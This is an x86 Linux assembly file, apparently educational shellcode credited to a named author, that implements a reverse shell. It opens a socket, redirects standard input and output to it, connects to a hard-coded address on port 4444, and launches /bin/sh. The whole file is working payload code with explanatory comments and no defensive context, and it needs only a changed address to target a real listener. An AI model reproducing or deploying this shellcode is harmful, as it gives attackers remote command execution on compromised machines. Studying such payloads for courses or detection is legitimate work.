;reverse_shell
;author:Swaroop Yermalkar

global _start
section .text
_start:

;sockfd = socket(AF_INET, SOCK_STREAM, 0);

xor ebx,ebx
xor eax,eax

;sock = socket(AF_INET, SOCK_STREAM, 0);
;1st argument: 0
;2nd argument: SOCK_STREAM = 0x1
;3rd argument: AF_INET = 0x2

mov byte al,0x66 ;syscall for socket(). 102 in hex is 0x66
push ebx ;push 0 as first argument
inc ebx ;Make ebx to 1
push ebx;push 1 as second argument
push byte 0x2 ;Push 0x2 as third argument
mov ecx, esp ;Save argument list to ecx
int 0x80 ;and execute socket syscal

;dup2 call

xchg ebx,eax

push byte 0x2
pop ecx

dup_loop:
  mov BYTE al, 0x3F 
  int 0x80          
  dec ecx           
  jns dup_loop      

;argument1: server.sin_addr.s_addr = inet_addr("127.0.0.1");
;argument2: server.sin_port = htons(4444);
;argument3: server.sin_family = AF_INET;

push 0x0101017f  ;push first argument i.e ip
push word 0x5c11 ;push port no
push word 2 ;push 2 for AF_INET
mov ecx,esp ;save argument list on stack

;connect(sock, (struct sockaddr *)&server, sockaddr_len);

push byte 0x10  ;sockaddr_len
push ecx  ;(struct sockaddr *)&server           
push ebx   ;push for socket descriptor              
mov ecx,esp ;save argument list to ecx
mov al,102 ;socket call               
int 0x80 ;and execute

;execve

xor eax,eax
push eax

;push //bin/sh

push 0x68732f6e
push 0x69622f2f

mov ebx,esp

push eax
mov ecx,esp

push ebx
mov edx,esp

mov al,11
int 0x80
